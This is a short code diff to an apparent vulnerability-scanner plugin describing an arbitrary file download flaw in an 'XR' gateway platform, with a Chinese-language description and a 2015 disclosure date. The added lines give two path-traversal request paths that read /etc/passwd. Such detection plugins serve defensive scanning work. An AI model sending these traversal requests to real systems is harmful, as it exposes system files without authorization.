@@ -10,6 +10,9 @@ class Vuln(ABVuln):
     type = VulnType.FILE_DOWNLOAD # 漏洞类型
     disclosure_date = '2015-08-28'  # 漏洞公布时间
     desc = '''
+        XR网关平台 任意文件遍历下载漏洞：
+        /msa/../../../../../../../../etc/passwd 
+        /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=test.txt+downLoadFile=../etc/passwd
     '''  # 漏洞描述
     ref = 'http://www.codesec.net/view/249007.html'  # 漏洞来源
     cnvd_id = ''  # cnvd漏洞编号
